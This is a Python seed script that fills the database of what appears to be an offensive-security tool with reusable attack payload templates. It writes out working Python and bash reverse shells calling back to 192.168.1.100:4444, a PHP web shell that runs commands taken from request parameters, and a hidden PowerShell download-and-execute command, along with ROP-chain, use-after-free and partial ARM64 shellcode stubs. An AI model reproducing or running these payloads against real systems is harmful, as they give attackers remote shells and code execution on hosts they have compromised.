from app.database.session import SessionLocal
from app.models import models
from app.database.base import Base
from app.database.session import engine

def seed_payloads():
    db = SessionLocal()

    payloads = [
        {
            "name": "Python Reverse Shell",
            "type": "reverse_shell",
            "base_code": "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.100\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")",
            "notes": "Standard python reverse shell for Linux targets."
        },
        {
            "name": "Bash TCP Reverse Shell",
            "type": "reverse_shell",
            "base_code": "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
            "notes": "Minimalist bash reverse shell."
        },
        {
            "name": "ROP Chain - Execve /bin/sh",
            "type": "rop_chain",
            "base_code": (
                "# ROP Chain for x86_64\n"
                "pop_rdi = 0x401234  # pop rdi; ret\n"
                "bin_sh = 0x601000   # address of \"/bin/sh\"\n"
                "system = 0x401080   # address of system()\n"
                "\n"
                "payload = b'A' * 72\n"
                "payload += p64(pop_rdi)\n"
                "payload += p64(bin_sh)\n"
                "payload += p64(system)"
            ),
            "notes": "Classic ROP chain to call system('/bin/sh') on Linux x86_64."
        },
        {
            "name": "Use-After-Free Trigger",
            "type": "uaf",
            "base_code": (
                "/* Simulated UAF in C */\n"
                "char *p = malloc(32);\n"
                "strcpy(p, \"Secret Data\");\n"
                "free(p);\n"
                "// ... later ...\n"
                "char *q = malloc(32);\n"
                "strcpy(q, \"Malicious Input\");\n"
                "printf(\"Data: %s\\n\", p); // Accessing freed memory"
            ),
            "notes": "Demonstration of a Use-After-Free vulnerability trigger."
        },
        {
            "name": "PHP Web Shell",
            "type": "web_shell",
            "base_code": "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; } ?>",
            "notes": "Simple PHP one-liner web shell."
        },
        {
            "name": "ARM64 Reverse Shell (Assembly)",
            "type": "reverse_shell",
            "base_code": (
                ".global _start\n"
                "_start:\n"
                "    // socket(AF_INET, SOCK_STREAM, 0)\n"
                "    mov x0, #2\n"
                "    mov x1, #1\n"
                "    mov x2, #0\n"
                "    mov x8, #198\n"
                "    svc #0\n"
                "    // ... connect, dup2, execve omitted for brevity ..."
            ),
            "notes": "Low-level ARM64 assembly reverse shell stub."
        },
        {
            "name": "PowerShell Download & Execute",
            "type": "cmd",
            "base_code": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')\"",
            "notes": "Windows post-exploitation command to download and run a script."
        }
    ]

    for p_data in payloads:
        existing = db.query(models.Payload).filter(models.Payload.name == p_data["name"]).first()
        if not existing:
            payload = models.Payload(
                name=p_data["name"],
                type=p_data["type"],
                base_code=p_data["base_code"],
                notes=p_data["notes"],
                is_template=True
            )
            db.add(payload)

    db.commit()
    db.close()

if __name__ == "__main__":
    seed_payloads()
    print("Seeded payloads into the database.")
